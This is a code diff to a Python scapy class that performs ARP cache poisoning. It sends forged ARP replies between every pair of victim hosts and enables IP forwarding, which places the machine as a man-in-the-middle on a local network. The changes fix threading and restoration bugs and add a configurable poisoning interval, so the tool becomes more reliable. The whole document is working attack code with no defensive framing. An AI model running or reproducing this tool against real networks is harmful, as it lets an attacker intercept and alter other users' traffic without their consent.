@@ -2,12 +2,12 @@ from scapy.all import *
 import signal
 import sys
 import time
+import threading
 
 from scapy.layers.l2 import arping, Ether, ARP
 
 
-class ArpPois():
-
+class ArpPois:
     def __init__(self):
         self.victims_ip = None
         self.victims_mac = None
@@ -15,6 +15,8 @@ class ArpPois():
         self.target_mac = None
         self.stop = False
         self.thread = None
+        self.stop_thread = None
+        self.sleep_time = 5
 
     def set_victims(self, victims_ip, victims_mac):
         self.victims_ip = victims_ip
@@ -24,15 +26,17 @@ class ArpPois():
         self.target_ip = target_ip
         self.target_mac = target_mac
 
+    def set_time(self, sleep):
+        self.sleep_time = sleep
+
     def poison(self, ip2, ip, mac2, mac):
         send(ARP(op=2, pdst=ip2, psrc=ip, hwdst=mac2, hwsrc=self.target_mac))
         send(ARP(op=2, pdst=ip, psrc=ip2, hwdst=mac, hwsrc=self.target_mac))
 
     @staticmethod
     def restore(ip2, ip, mac2, mac):
-        send(ARP(op=2, pdst=ip, psrc=ip2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac2), count=3)
-        send(ARP(op=2, pdst=ip2, psrc=ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac), count=3)
-        sys.exit("losing...")
+        send(ARP(op=2, pdst=ip, psrc=ip2, hwdst=mac, hwsrc=mac2), count=3)
+        send(ARP(op=2, pdst=ip2, psrc=ip, hwdst=mac2, hwsrc=mac), count=3)
 
     def run(self):
         with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
@@ -43,19 +47,27 @@ class ArpPois():
                 for ip2, mac2 in zip(self.victims_ip, self.victims_mac):
                     if ip != ip2:
                         self.poison(ip2, ip, mac2, mac)
-            time.sleep(5)
+            time.sleep(self.sleep_time)
 
-    def start(self):
+    def start_poisoning(self):
         self.stop = False
-        self.thread = threading.Thread(target=self.run())
+        self.thread = threading.Thread(target=self.run)
         self.thread.start()
 
-    def stop(self):
+    def stop_poisoning(self):
         self.stop = True
         self.thread.join()
 
         with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
             ipf.write('0\n')
 
-        for vic_ip, vic_mac in self.victims_ip, self.victims_mac:
-            self.restore(self.target_ip, vic_ip, self.target_mac, vic_mac)
+        # TODO: Use a thread to stop for user convenience
+        self.stop_thread = threading.Thread(target=self.restore_network)
+        self.stop_thread.start()
+        self.stop_thread.join()
+
+    def restore_network(self):
+        for ip, mac in zip(self.victims_ip, self.victims_mac):
+            for ip2, mac2 in zip(self.victims_ip, self.victims_mac):
+                if ip != ip2:
+                    self.restore(ip2, ip, mac2, mac)
